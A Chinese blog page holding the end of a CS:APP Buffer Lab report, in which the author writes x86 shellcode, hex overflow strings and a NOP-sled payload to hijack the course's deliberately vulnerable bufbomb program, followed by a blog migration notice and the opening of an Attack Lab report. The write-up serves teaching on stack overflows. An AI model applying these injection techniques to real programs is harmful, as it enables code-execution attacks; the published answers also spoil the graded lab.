<p>接下来我们要通过gcc和objdump生成攻击代码，具体的操作和Attack Lab相似，我们首先新建一个level2-exploit.s文件，在其中编写相应的攻击代码，如下：<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">mov</span> <span class="number">$0</span>x3dde924c, %eax</div><div class="line"><span class="keyword">mov</span> %eax, <span class="number">0x804d100</span> <span class="comment">;设置全局变量</span></div><div class="line"><span class="keyword">add</span> <span class="number">$16</span>, %esp <span class="comment">;修改栈顶</span></div><div class="line"><span class="keyword">ret</span> <span class="comment">;返回</span></div></pre></td></tr></table></figure></p>
<p>然后我们依次使用<code>gcc -m32 -c level2-exploit.s</code>和<code>objdump -d level2-exploit.o &gt; level2-exploit.d</code>将攻击代码汇编和反汇编，具体的命令和结果如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">user@BlackDragon ~/C/B/buflab-handout&gt; gcc -m32 -c level2-exploit.s                          </div><div class="line">user@BlackDragon ~/C/B/buflab-handout&gt; objdump -d level2-exploit.o &gt; level2-exploit.d</div><div class="line">user@BlackDragon ~/C/B/buflab-handout&gt; cat level2-exploit.d                                    </div><div class="line"></div><div class="line">level2-exploit.o：     文件格式 elf32-i386</div><div class="line"></div><div class="line"></div><div class="line">Disassembly of section .text:</div><div class="line"></div><div class="line">00000000 &lt;.text&gt;:</div><div class="line">   0:	b8 4c 92 de 3d       	mov    <span class="variable">$0x3dde924c</span>,%eax</div><div class="line">   5:	a3 00 d1 04 08       	mov    %eax,0x804d100</div><div class="line">   a:	83 c4 10             	add    <span class="variable">$0x10</span>,%esp</div><div class="line">   d:	c3                   	ret     </div></pre></td></tr></table></figure>　</p>
<p>最后我们根据以上的信息来生成我们最终的攻击代码，如下:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00 /* 前40个字节 */</div><div class="line">00 00 00 00 58 2f 68 55 /* 保存的%ebp以及返回地址(在栈上) */</div><div class="line">b8 4c 92 de 3d a3 00 d1</div><div class="line">04 08 83 c4 10 c3 00 00 /* 攻击代码 */</div><div class="line">9d 8c 04 08　           /* 返回地址指向函数bang */</div></pre></td></tr></table></figure></p>
<p>下面我们使用hex2raw生成攻击字符串并测试，结果如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">user@BlackDragon ~/C/B/buflab-handout&gt; cat level2.txt|./hex2raw|./bufbomb -u BlackDragon</div><div class="line">Userid: BlackDragon</div><div class="line">Cookie: 0x3dde924c</div><div class="line">Type string:Bang!: You <span class="built_in">set</span> global_value to 0x3dde924c</div><div class="line">VALID</div><div class="line">NICE JOB!</div></pre></td></tr></table></figure></p>
<p>阶段2完成。</p>
<h3 id="阶段3：炸药（Dynamite）"><a href="#阶段3：炸药（Dynamite）" class="headerlink" title="阶段3：炸药（Dynamite）"></a>阶段3：炸药（Dynamite）</h3><p>在前面的几个阶段中，我们所有的攻击都导致程序跳转至其他函数并退出。所以，使用会破坏栈的攻击代码是可行的。</p>
<p>在该阶段中，你需要修改程序的寄存器和内存状态，并且使程序能正确的返回值原调用者函数并且不出错。这就意味着你必须：</p>
<ol>
<li>在栈上执行机器代码</li>
<li>将返回指针置于代码的起始</li>
<li>修复对栈造成的破坏</li>
</ol>
<p>具体来说，你需要让函数getbuf返回cookie而不是1至函数test。注意到在test中当返回值为cookie时程序会输出”Boom!”。你的攻击代码应当将cookie设置为返回值，恢复任何被破坏的状态，将正确的返回地址push到栈上，最终执行ret指令。</p>
<p>对于该阶段，我们的思路如下：</p>
<ol>
<li>缓冲区溢出的部分要保证保存的%ebp不变以方便后续的寻址过程（攻击代码中使用）。然后和阶段2一样，通过溢出使程序跳转至栈上执行相应的攻击代码</li>
<li>攻击代码首先将返回地址设置为正确的返回地址（调用者的下一条指令）</li>
<li>然后再将返回值（%eax）设置为cookie</li>
<li>最终修改栈顶（%esp）并ret</li>
</ol>
<p>缓冲区溢出攻击后，我们期望的整个程序的执行过程如下：</p>
<ol>
<li>跳转至栈上执行代码，此时%esp被修改至第48个字节处，且%ebp中存有正确的值。</li>
<li>程序执行攻击代码，该攻击代码重置了返回地址，覆盖了getbuf的返回值，修改了栈顶指针并ret</li>
<li>程序带着完整的栈状态和修改后的返回值返回至test函数，并继续执行</li>
</ol>
<p>下面我们讨论一下攻击代码中具体的细节。</p>
<p>首先是保存的ebp的值到底是多少，这个我们可以在gdb中直接调试打印得出，为0x55682f80。<br>栈上的返回地址和阶段2一样，为0x55682f58。</p>
<p>然后我们的攻击代码如下：<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">mov</span> <span class="number">$0</span>x8048dbe, %eax <span class="comment">;将真正的返回地址送入%eax</span></div><div class="line"><span class="keyword">mov</span> %eax, -<span class="number">0x2c</span>(%ebp) <span class="comment">;将%eax送入栈上的正确位置</span></div><div class="line"><span class="keyword">mov</span> <span class="number">$0</span>x3dde924c, %eax <span class="comment">;修改返回值</span></div><div class="line"><span class="keyword">sub</span> <span class="number">$4</span>, %esp <span class="comment">;修改栈顶%esp</span></div><div class="line"><span class="keyword">ret</span></div></pre></td></tr></table></figure></p>
<p>这里讨论一下为什么是-0x2c(%ebp)，保存的%ebp是调用者的栈底，我们观察调用者函数test的反汇编代码，如下：<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line">08048<span class="keyword">daa</span> &lt;<span class="keyword">test</span>&gt;:</div><div class="line"> 8048<span class="keyword">daa</span>:       <span class="number">55</span>                      <span class="keyword">push</span>   %ebp</div><div class="line"> 8048dab:       <span class="number">89</span> e5                   <span class="keyword">mov</span>    %esp,%ebp</div><div class="line"> 8048dad:       <span class="number">53</span>                      <span class="keyword">push</span>   %ebx</div><div class="line"> 8048dae:       <span class="number">83</span> ec <span class="number">24</span>                <span class="keyword">sub</span>    <span class="number">$0</span>x24,%esp</div><div class="line"> 8048db1:       e8 da ff ff ff          <span class="keyword">call</span>   8048d90 &lt;uniqueval&gt;</div><div class="line"> 8048db6:       <span class="number">89</span> <span class="number">45</span> f4                <span class="keyword">mov</span>    %eax,-<span class="number">0xc</span>(%ebp)</div><div class="line"> 8048db9:       e8 <span class="number">36</span> <span class="number">04</span> <span class="number">00</span> <span class="number">00</span>          <span class="keyword">call</span>   80491f4 &lt;getbuf&gt;</div><div class="line"> 8048dbe:       <span class="number">89</span> c3                   <span class="keyword">mov</span>    %eax,%ebx</div><div class="line"> 8048dc0:       e8 cb ff ff ff          <span class="keyword">call</span>   8048d90 &lt;uniqueval&gt;</div><div class="line"> 8048dc5:       8b <span class="number">55</span> f4                <span class="keyword">mov</span>    -<span class="number">0xc</span>(%ebp),%edx</div><div class="line"> 8048dc8:       <span class="number">39</span> d0                   <span class="keyword">cmp</span>    %edx,%eax</div><div class="line"> 8048dca:       <span class="number">74</span> 0e                   <span class="keyword">je</span>     8048dda &lt;<span class="keyword">test</span>+<span class="number">0x30</span>&gt;</div><div class="line"> 8048dcc:       c7 <span class="number">04</span> <span class="number">24</span> <span class="number">88</span> a3 <span class="number">04</span> <span class="number">08</span>    movl   <span class="number">$0</span>x804a388,(%esp)</div><div class="line"> 8048dd3:       e8 e8 fa ff ff          <span class="keyword">call</span>   80488c0 &lt;puts@plt&gt;</div><div class="line"> 8048dd8:       eb <span class="number">46</span>                   <span class="keyword">jmp</span>    8048e20 &lt;<span class="keyword">test</span>+<span class="number">0x76</span>&gt;</div><div class="line"> 8048dda:       3b <span class="number">1d</span> <span class="number">08</span> d1 <span class="number">04</span> <span class="number">08</span>       <span class="keyword">cmp</span>    <span class="number">0x804d108</span>,%ebx</div><div class="line"> 8048de0:       <span class="number">75</span> <span class="number">26</span>                   <span class="keyword">jne</span>    8048e08 &lt;<span class="keyword">test</span>+<span class="number">0x5e</span>&gt;</div><div class="line"> 8048de2:       <span class="number">89</span> 5c <span class="number">24</span> <span class="number">08</span>             <span class="keyword">mov</span>    %ebx,<span class="number">0x8</span>(%esp)</div><div class="line"> 8048de6:       c7 <span class="number">44</span> <span class="number">24</span> <span class="number">04</span> 2a a5 <span class="number">04</span>    movl   <span class="number">$0</span>x804a52a,<span class="number">0x4</span>(%esp)</div><div class="line"> 8048ded:       <span class="number">08</span></div><div class="line"> 8048dee:       c7 <span class="number">04</span> <span class="number">24</span> <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    movl   <span class="number">$0</span>x1,(%esp)</div><div class="line"> 8048df5:       e8 c6 fb ff ff          <span class="keyword">call</span>   80489c0 &lt;__printf_chk@plt&gt;</div><div class="line"> 8048dfa:       c7 <span class="number">04</span> <span class="number">24</span> <span class="number">03</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    movl   <span class="number">$0</span>x3,(%esp)</div><div class="line"> 8048e01:       e8 <span class="number">75</span> <span class="number">05</span> <span class="number">00</span> <span class="number">00</span>          <span class="keyword">call</span>   804937b &lt;validate&gt;</div><div class="line"> 8048e06:       eb <span class="number">18</span>                   <span class="keyword">jmp</span>    8048e20 &lt;<span class="keyword">test</span>+<span class="number">0x76</span>&gt;</div><div class="line"> 8048e08:       <span class="number">89</span> 5c <span class="number">24</span> <span class="number">08</span>             <span class="keyword">mov</span>    %ebx,<span class="number">0x8</span>(%esp)</div><div class="line"> 8048e0c:       c7 <span class="number">44</span> <span class="number">24</span> <span class="number">04</span> <span class="number">47</span> a5 <span class="number">04</span>    movl   <span class="number">$0</span>x804a547,<span class="number">0x4</span>(%esp)</div><div class="line"> 8048e13:       <span class="number">08</span></div><div class="line"> 8048e14:       c7 <span class="number">04</span> <span class="number">24</span> <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    movl   <span class="number">$0</span>x1,(%esp)</div><div class="line"> 8048e1b:       e8 a0 fb ff ff          <span class="keyword">call</span>   80489c0 &lt;__printf_chk@plt&gt;</div><div class="line"> 8048e20:       <span class="number">83</span> c4 <span class="number">24</span>                <span class="keyword">add</span>    <span class="number">$0</span>x24,%esp</div><div class="line"> 8048e23:       5b                      <span class="keyword">pop</span>    %ebx</div><div class="line"> 8048e24:       <span class="number">5d</span>                      <span class="keyword">pop</span>    %ebp</div><div class="line"> 8048e25:       c3                      <span class="keyword">ret</span>    </div></pre></td></tr></table></figure></p>
<p>我们可以知道函数test在栈上分配了0x24=36个字节的空间，而在这之前栈上还有被push的%ebx占4个字节，那么如果要想要定位到调用者栈顶的返回地址，偏移量应为36+4+4=44=0x2c，考虑到栈自高地址向低地址增长，所以应为-0x2c(%ebp)。</p>
<p>而程序从getbuf返回时栈顶指针并没有指向我们设置的返回地址，而是指向了栈上紧邻着该地址的高地址位置，所以我们需要将%esp-4以确保其指向了我们设置的返回地址，使得程序能正确返回。</p>
<p>下面我们使用gcc和objdump生成攻击代码，并且我们最终的攻击代码如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00 /* 前40个字节 */</div><div class="line">80 2f 68 55 58 2f 68 55 /* 保存的%ebp和返回地址（位于栈上） */</div><div class="line">b8 be 8d 04 08 89 45 d4 /* 攻击代码 */</div><div class="line">b8 4c 92 de 3d 83 ec 04</div><div class="line">c3</div></pre></td></tr></table></figure></p>
<p>最后我们使用hex2raw生成攻击字符串并测试，结果如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">user@BlackDragon ~/C/B/buflab-handout&gt; cat level3.txt|./hex2raw|./bufbomb -u BlackDragon         </div><div class="line">Userid: BlackDragon</div><div class="line">Cookie: 0x3dde924c</div><div class="line">Type string:Boom!: getbuf returned 0x3dde924c</div><div class="line">VALID</div><div class="line">NICE JOB!</div></pre></td></tr></table></figure></p>
<p>阶段3完成。</p>
<h4 id="攻击代码的优化"><a href="#攻击代码的优化" class="headerlink" title="攻击代码的优化"></a>攻击代码的优化</h4><p>注意到在上面我们的攻击代码还是很麻烦的，我们不仅花了很大的时间保证被保存的%ebp不变，还调整了栈顶指针使得函数能正确返回。</p>
<p>其实，我们可以使用push returnAddress，ret来达到返回到指定位置的效果。也能直接在攻击代码中设置%ebp的值，这样，我们的攻击代码如下：<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">mov</span> <span class="number">$0</span>x3dde924c,%eax <span class="comment">;返回值</span></div><div class="line"><span class="keyword">mov</span> <span class="number">$0</span>x55682f80,%ebp <span class="comment">;修改%ebp</span></div><div class="line"><span class="keyword">push</span> <span class="number">$0</span>x8048dbe <span class="comment">;将返回地址压栈</span></div><div class="line"><span class="keyword">ret</span></div></pre></td></tr></table></figure></p>
<p>根据以上的信息重新生成我们的攻击代码：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00 /* 前40个字节 */</div><div class="line">00 00 00 00 58 2f 68 55 /* 保存的%ebp和返回地址（位于栈上）*/</div><div class="line">b8 4c 92 de 3d bd 80 2f /* 攻击代码 */</div><div class="line">68 55 68 be 8d 04 08 c3</div></pre></td></tr></table></figure></p>
<p>使用hex2raw生成攻击字符串并测试，结果如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">user@BlackDragon ~/C/B/buflab-handout&gt; cat level3-2.txt|./hex2raw|./bufbomb -u BlackDragon          </div><div class="line">Userid: BlackDragon</div><div class="line">Cookie: 0x3dde924c</div><div class="line">Type string:Boom!: getbuf returned 0x3dde924c</div><div class="line">VALID</div><div class="line">NICE JOB!</div></pre></td></tr></table></figure></p>
<h3 id="阶段4：硝化甘油（Nitroglycerin）"><a href="#阶段4：硝化甘油（Nitroglycerin）" class="headerlink" title="阶段4：硝化甘油（Nitroglycerin）"></a>阶段4：硝化甘油（Nitroglycerin）</h3><blockquote>
<p>需要为bufbomb以及hex2raw添加命令行参数’-n’以执行本阶段</p>
</blockquote>
<p>本阶段非常的具有挑战性，在本阶段中，函数getbuf的栈帧的位置在每次运行时都是不同的。栈随机化的策略明显提升了攻击的难度。</p>
<p>具体来说，在该阶段中，程序会调用getbufn来从标准输入流中读取数据，和getbuf不同的是，getbufn具有512个字节的缓冲区，并且，在相邻两次getbufn的调用中，%ebp的值将会出现最多+-240的误差。除此以外，在该阶段中，程序总共会使用5次你所输入的字符串，也就是说，总共会调用5次getbufn。同阶段3的任务相似，你必须保证每一次调用getbufn，其返回值均为cookie。</p>
<p>若返回值为cookie，则程序会输出”KABOOM!”。你的攻击代码需要在5次栈帧位置不同的函数getbuf的调用中设置cookie为返回值，恢复对栈造成的破坏，设置正确的返回地址，并最终执行ret执行以返回testn。</p>
<p>在本阶段中我们需要使用一种名为nop雪橇（nop sled）的攻击方式来对抗随机化。具体来说，就是通过在攻击代码前大量插入nop（空操作，编码为90）。这样，就算栈的起始地址在一定范围内波动，只要程序能跳转至其中一个nop指令，就能顺着这一组nop指令滑向我们真正的攻击代码。</p>
<p>首先我们需要考虑的是我们攻击代码的长度，由于必须要通过缓冲区溢出覆盖掉函数getbufn的返回地址，所以攻击代码的长度至少为520个字节的缓冲区，4个字节的被保存的%ebp，以及4个字节的返回地址。</p>
<p>我们将攻击代码放在缓冲区的最后，并且用90（nop）填充所有未被利用到的缓冲区以实现一个nop sled。</p>
<p>具体的攻击代码如下：<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">lea</span> <span class="number">0x28</span>(%esp), %ebp <span class="comment">;复原%ebp</span></div><div class="line"><span class="keyword">mov</span> <span class="number">$0</span>x3dde924c, %eax <span class="comment">;设置cookie</span></div><div class="line"><span class="keyword">push</span> <span class="number">$0</span>x8048e3a <span class="comment">;将返回地址压栈</span></div><div class="line"><span class="keyword">ret</span></div></pre></td></tr></table></figure></p>
<p>注意到我们无法再采用阶段3中的办法来复原%ebp了。但是注意到，当函数从getbufn返回时，%esp的值是正确的，而%esp和%ebp的相对差值是固定的，因此我们可以根据函数返回时的%esp去还原%ebp，对于testn来说，%esp和%ebp之间相差了36+4=40=0x28个字节。</p>
<p>最后是返回地址的设定，在gdb中观察可知第一次执行时buf的地址为0x55682f40，因此我们将返回地址设置为0x55682f40-480=0x55682d60可保证每次都能命中。</p>
<p>最终我们的攻击代码如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 /* nop sled */</div><div class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 8d 6c 24</div><div class="line">28 b8 4c 92 de 3d 68 3a 8e 04 08 c3 60 2d 68 55 /* 攻击代码与返回地址 */</div></pre></td></tr></table></figure></p>
<p>使用hex2raw生成攻击字符串并测试，结果如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">user@BlackDragon ~/C/B/buflab-handout&gt; cat level4.txt|./hex2raw -n|./bufbomb -u BlackDragon -n  </div><div class="line">Userid: BlackDragon</div><div class="line">Cookie: 0x3dde924c</div><div class="line">Type string:KABOOM!: getbufn returned 0x3dde924c</div><div class="line">Keep going</div><div class="line">Type string:KABOOM!: getbufn returned 0x3dde924c</div><div class="line">Keep going</div><div class="line">Type string:KABOOM!: getbufn returned 0x3dde924c</div><div class="line">Keep going</div><div class="line">Type string:KABOOM!: getbufn returned 0x3dde924c</div><div class="line">Keep going</div><div class="line">Type string:KABOOM!: getbufn returned 0x3dde924c</div><div class="line">VALID</div><div class="line">NICE JOB!</div></pre></td></tr></table></figure></p>
<p>阶段4完成。</p>
<h2 id="实验总结"><a href="#实验总结" class="headerlink" title="实验总结"></a>实验总结</h2><p>Buffer Lab整体上同Attack Lab的第1部分，代码注入攻击相似，不同在于需要了解IA32的栈帧结构，过程调用以及参数传递的原理。</p>
<p>除此以外，还需要了解对抗栈随机化的一种攻击方式 - nop sled。</p>

                    
                        
                    
                    
                        <p>
                            <a href="/2017/05/16/深入理解计算机系统BufferLab实验报告/#post-footer" class="postShorten-excerpt_link link">
                                评论和共享
                            </a>
                        </p>
                    
                </div>
            
        </div>
        
    </article>
    
    
    <article class="postShorten postShorten--thumbnailimg-bottom" itemscope itemType="http://schema.org/BlogPosting">
        <div class="postShorten-wrap">
            
            <div class="postShorten-header">
                <h1 class="postShorten-title" itemprop="headline">
                    
                        <a class="link-unstyled" href="/2017/05/12/迁移说明/">
                            迁移说明
                        </a>
                    
                </h1>
                <div class="postShorten-meta">
    <time itemprop="datePublished" datetime="2017-05-12T17:36:25+08:00">
	
		    5月 12, 2017
    	
    </time>
    
        <span>发布在 </span>
        
    <a class="category-link" href="/categories/通知/">通知</a>


    
</div>

            </div>
            
                <div class="postShorten-content" itemprop="articleBody">
                    <h2 id="博客历史"><a href="#博客历史" class="headerlink" title="博客历史"></a>博客历史</h2><ul>
<li>本博客自2016年1月4日上线。最早部署于BlackDragon的阿里云上，使用的是WordPress框架，服务器则采用了LAMP环境，DNS解析至一级域名。</li>
<li>博客自上线后曾频繁的出现无法连接至数据库的情况，经过检查可能的原因是Apache占用的内存过大以至于MySQL服务被杀。后采用LNMP环境。</li>
<li>2016年12月12日，将博客整个导出至Hexo并且部署至Github Pages，DNS解析至二级域名blog，原服务器与域名停止解析。</li>
</ul>
<h2 id="博客迁移"><a href="#博客迁移" class="headerlink" title="博客迁移"></a>博客迁移</h2><blockquote>
<p>博客迁移的原因<br>在目前，我仍然希望这个博客的内容能被更多的人关注到，也希望能和更多的人交流，所以向Google和Baidu分别提交了Sitemap。<br>但是因国内Baidu仍然作为主要的搜索引擎，加上Github屏蔽了Baidu的爬虫，无法让博客的Sitemap被Baidu抓取并索引，在进行了尝试后决定将博客迁移。</p>
</blockquote>
<p>在遇到上述问题时，我首先尝试了将hexo生成的博客部署到Github以及Coding两个代码仓库，并通过DNS解析将国内和国外的访问分别解析至Coding和Github，并解决了问题。</p>
<p>但是个人觉得这样做不够优雅，经过考虑还是决定将博客重新迁移至自己的阿里云，使用CentOS7作为Server，Nginx作为Web Server，同时将Github的Repo作为Mirror。</p>
<p>博客于2017年5月11日完成迁移，又于2017年5月12日完成相应的优化调整。</p>
<p>现在你可以访问</p>
<ul>
<li><a href="http://blog.duskdragon.com">blog.duskdragon.com</a> 主站点</li>
<li><a href="https://blackdragonf.github.io/" target="_blank" rel="external">blackdragonf.github.io</a> 备份站点</li>
</ul>
<blockquote>
<p>这个博客的意义<br>这个博客不是技术博客（目前），因为我现在并没有足够的技能去支持一个技术博客。我现在仅仅是作为一个学习者记录在学习过程中遇到的各种问题，并且将学到的知识加以总结。欢迎任何的技术交流以及错误指正。<br>如果我所记录的题目的解答或是实验的报告能够给同样还在学习的你带来帮助，这就是对我最大的鼓励。</p>
</blockquote>
<h3 id="迁移过程中遇到的问题"><a href="#迁移过程中遇到的问题" class="headerlink" title="迁移过程中遇到的问题"></a>迁移过程中遇到的问题</h3><ul>
<li>在配置iptables时，我在没有开放22端口的情况下将INPUT的默认策略设置为DROP，直接导致了ssh断开连接，不得不重置了阿里云。</li>
<li>/home下的用户文件夹默认不具有读和执行权限，而我的html根目录放在家目录下，这导致了我在部署nginx时出现了403 Forbidden的错误。</li>
</ul>
<h2 id="优化调整"><a href="#优化调整" class="headerlink" title="优化调整"></a>优化调整</h2><p>本次迁移博客同时对于博客做出了以下优化及调整：</p>
<ul>
<li>将背景图片从PNG格式改为JPG格式，减少网页加载的时间</li>
<li>之前为了美观采用了WQY字体，但是将字体作为资源文件大大延长了加载的时间，现在博客的中文字体采用了Google Fonts中的Noto Sans SC</li>
</ul>

                    
                        
                    
                    
                        <p>
                            <a href="/2017/05/12/迁移说明/#post-footer" class="postShorten-excerpt_link link">
                                评论和共享
                            </a>
                        </p>
                    
                </div>
            
        </div>
        
    </article>
    
    
    <article class="postShorten postShorten--thumbnailimg-bottom" itemscope itemType="http://schema.org/BlogPosting">
        <div class="postShorten-wrap">
            
            <div class="postShorten-header">
                <h1 class="postShorten-title" itemprop="headline">
                    
                        <a class="link-unstyled" href="/2017/05/09/深入理解计算机系统AttackLab实验报告/">
                            深入理解计算机系统AttackLab实验报告
                        </a>
                    
                </h1>
                <div class="postShorten-meta">
    <time itemprop="datePublished" datetime="2017-05-09T13:56:05+08:00">
	
		    5月 09, 2017
    	
    </time>
    
        <span>发布在 </span>
        
    <a class="category-link" href="/categories/计算机系统/">计算机系统</a>


    
</div>

            </div>
            
                <div class="postShorten-content" itemprop="articleBody">
                    <p>实验答案托管在我的<a href="https://github.com/BlackDragonF/CSAPPLabs/tree/master/AttackLab" target="_blank" rel="external">Github</a>上</p>
<blockquote>
<p>花了一天时间于2017年5月4日完成了《深入理解计算机系统》的第三个Lab - Attack Lab。这个实验对应于书本第三章：程序的机器级表示中，缓冲区溢出攻击部分。</p>
</blockquote>
<h2 id="实验简介"><a href="#实验简介" class="headerlink" title="实验简介"></a>实验简介</h2><p>Attack Lab是Buffer Lab的64位版本。在这个实验中，目标是通过代码注入攻击（Code Injection Attack）和返回导向编程（Return Oriented Programming）两种攻击方式，分别修改具有缓冲区溢出漏洞的两个x86_64可执行文件的行为。</p>
<p>本实验主要加深了对于栈规则的理解，以及说明了缓冲区溢出漏洞可能造成的危险后果。</p>
<p>本实验使用了官网给出的自学者讲义中的<a href="http://csapp.cs.cmu.edu/3e/target1.tar" target="_blank" rel="external">Ubuntu 12.4 targets</a>，并且使用了运行时参数-q来避免该程序连接远程的计分服务器。</p>
<h2 id="实验准备"><a href="#实验准备" class="headerlink" title="实验准备"></a>实验准备</h2><p>实验讲义中的target1.tar主要包含了以下文件：</p>
<ul>
<li>README.txt 描述了目录内容</li>
<li>ctarget 一个易受代码注入攻击的可执行程序</li>
<li>rtarget 一个易受返回导向编程攻击的可执行程序</li>
<li>cookie.txt 在攻击中用到的唯一标识符，是8位的16进制代码</li>
